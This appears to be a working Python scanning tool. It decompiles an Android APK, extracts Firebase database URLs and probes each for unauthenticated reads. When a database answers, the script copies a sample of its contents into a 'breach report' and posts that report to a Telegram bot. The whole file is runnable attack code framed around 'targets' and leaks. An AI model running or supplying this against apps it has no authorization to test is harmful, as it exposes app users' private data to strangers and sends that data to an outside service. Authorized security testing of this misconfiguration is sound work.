import os
import re
import requests
import zipfile
from androguard.misc import AnalyzeAPK

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

def send_telegram_alert(message):
    if not TELEGRAM_BOT_TOKEN: return
    if len(message) > 4000: message = message[:4000] + "\n...[TRUNCATED]"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "disable_web_page_preview": True}
    try: requests.post(url, data=data)
    except: pass

def check_firebase_vuln(url):
    """Checks if the DB is publicly readable"""
    # We ask for the root JSON but limit it to 'shallow' to avoid crashing with 100GB files
    target = f"{url}/.json?shallow=true"
    try:
        r = requests.get(target, timeout=5)
        if r.status_code == 200:
            return True, r.text # BINGO!
        elif r.status_code == 401:
            return False, "Secure (Permission Denied)"
        elif r.status_code == 404:
            return False, "DB Not Found (Deleted)"
        else:
            return False, f"Status {r.status_code}"
    except Exception as e:
        return False, str(e)

def analyze_apk(apk_path):
    print(f"[*] Hunting Firebase URLs in {apk_path}...")
    report = f"🔥 **Firebase Breach Report: {apk_path}**\n\n"
    
    found_urls = set()

    try:
        # 1. DECOMPILE & SEARCH
        print("[*] Decompiling and scanning strings...")
        app, dex_list, dx = AnalyzeAPK(apk_path)
        
        # Scan every string in the app
        for dex in dex_list:
            for s in dex.get_strings():
                # Look for the firebase domain
                if "firebaseio.com" in s:
                    # Clean the URL
                    clean = s.strip()
                    if "https://" not in clean:
                        clean = f"https://{clean}"
                    # Remove trailing slashes
                    if clean.endswith("/"): 
                        clean = clean[:-1]
                    
                    found_urls.add(clean)

        # 2. PROBE FOR LEAKS
        if found_urls:
            report += f"**🎯 Targets Found:** {len(found_urls)}\n"
            
            for db_url in found_urls:
                print(f"[*] Probing {db_url}...")
                is_vuln, response = check_firebase_vuln(db_url)
                
                if is_vuln:
                    report += f"\n🚨 **VULNERABLE:** `{db_url}`\n"
                    report += f"   **Payload:** `{response[:300]}...`\n" # Show first 300 chars
                    report += f"   [Link to Database]({db_url}/.json)\n"
                else:
                    report += f"\n🛡️ **Secure:** `{db_url}`\n   Reason: {response}\n"
        else:
            report += "[-] No Firebase Configuration found."

        print(report)
        send_telegram_alert(report)

    except Exception as e:
        err = f"⚠️ Scan Failed: {e}"
        print(err)
        send_telegram_alert(err)

if __name__ == "__main__":
    files = [f for f in os.listdir('.') if f.endswith('.apk')]
    if files: analyze_apk(files[0])
    else: print("No APK found.")
